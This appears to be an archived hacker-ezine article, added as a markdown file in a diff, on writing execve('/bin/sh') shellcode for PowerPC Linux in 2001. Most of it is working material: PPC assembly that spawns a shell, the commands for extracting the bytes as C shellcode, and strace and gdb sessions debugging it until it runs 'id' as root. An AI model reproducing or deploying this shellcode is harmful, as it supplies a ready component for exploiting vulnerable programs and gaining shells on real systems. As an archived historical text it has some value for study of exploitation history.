@@ -1,0 +1,128 @@
+---
+title: "verify"
+ezine: "forbidden_knowledge"
+---
+
+# verify
+
+**Ezine:** forbidden_knowledge
+
+<div className="ascii-content">
+
+```
+Here is some hacked up asm for an execve on ppc linux.
+this was born on Mandrake Linux 8.0 ppc Wed Sep 19 09:34:50 EDT 2001.  
+I just bought an ibook and Optimizing PowerPC Code by G. Kacmarcik, 
+slapped Mandrake 8 on it and in under a month this is what I came up with. 
+This my first venture into asm so don't dis it unless you can do better. 
+The asm code was the direct product of delta 9 THC and the hex code is a 
+result of od2c.pl by corecode http://www.eikon.tum.de/~simons/security/. 
+
+\x2e\x2f
+
+------------&lt;snip>----------------------------
+
+# r0 is used for epilog / prolog code
+# r1 is stack pointer 
+# r3 - r10 1st - 8th fixed point paramaters
+# r11 is the enviornment pointer
+# r12 is for global linkage routines
+# r13 - r31 must be preserved throughout function calls
+
+.data
+.text
+.globl main 
+.globl shell
+main:
+  stwu    %r1,-16(%r1)
+  mflr    %r0   
+  stw     %r31,12(%r1)     
+  stw     %r0,20(%r1)   
+  mr      %r31,%r1   
+  .string "/bin/sh"
+  bl      shell
+  lwz     %r11,0(%r1)
+  lwz     %r0,4(%r11)  
+  mtlr    %r0   
+  lwz     %r31,-4(%r11) 
+  mr      %r1,%r11   
+  blr    
+
+shell:
+  mflr    %r3
+# use addi to find the offset of your string in memory
+#  addi    %r3,%r3,-12
+  addi    %r3,%r3,-40                     # hack from gdb output
+  li      %r5,0
+  li      %r0,11 
+  sc
+
+------------&lt;snip>----------------------------
+
+Heres how I compiled and extracted the shellcode from my asm. 
+
+[root@osx extract]# gcc -o execve -static -ggdb ./execve.s
+[root@osx extract]# ./execve -c id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+[root@osx extract]# objdump -d ./execve | ./od2c.pl main > shellcode.h
+[root@osx extract]# objdump -d ./execve | ./od2c.pl shell >> shellcode.h
+
+[root@osx extract]# cat shellcode.h >> shellcode.c     
+[root@osx extract]# gcc -o shellcode -static -ggdb ./shellcode.c
+./shellcode.c: In function `main':
+./shellcode.c:35: warning: return type of `main' is not `int'
+
+[root@osx extract]# ./shellcode
+Illegal instruction (core dumped)
+
+[root@osx extract]# strace ./shellcode
+execve("./shellcode", ["./shellcode"], [/* 45 vars */]) = 0
+uname({sys="Linux", node="osx.insight.rr.com", ...}) = 0
+geteuid()                               = 0
+getuid()                                = 0
+getegid()                               = 0
+getgid()                                = 0
+brk(0)                                  = 0x10069f20
+brk(0x10069f40)                         = 0x10069f40
+brk(0x1006a000)                         = 0x1006a000
+brk(0x1006b000)                         = 0x1006b000
+getpid()                                = 1577
+execve("}a[xNÇ", ["./shellcode"]ptrace: umoven: Input/output error
+, [/* 0 vars */]) = -1 ENOENT (No such file or directory)
+--- SIGILL (Illegal instruction) ---
++++ killed by SIGILL +++
+
+[root@osx extract]# gdb ./shellcode
+GNU gdb 5.0mdk-14mdk Linux-Mandrake 8.0
+This GDB was configured as "ppc-mandrake-linux"...
+(gdb) run
+Starting program: /root/extract/./shellcode
+
+Program received signal SIGILL, Illegal instruction.
+0x10067010 in shellcode ()
+
+(gdb) info register lr
+lr             0x10066fe4       268857316
+(gdb) x/10s 0x10066fe4-12
+0x10066fd8 &lt;shellcode+48>:       "}a[xN\200"
+
+(gdb) x/10s 0x10066fe4-40
+0x10066fbc &lt;shellcode+20>:       "/bin/sh"
+
+change shellcode to -40 instead of -12?
+
+fix code as follows 
+#  addi    %r3,%r3,-12
+  addi    %r3,%r3,-40                     # hack from gdb output
+
+modifyed code and it worked!
+[root@osx extract]# gcc -o shellcode -static -ggdb ./shellcode.c
+./shellcode.c: In function `main':
+./shellcode.c:33: warning: return type of `main' is not `int'
+[root@osx extract]# ./shellcode -c id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+```
+
+</div>
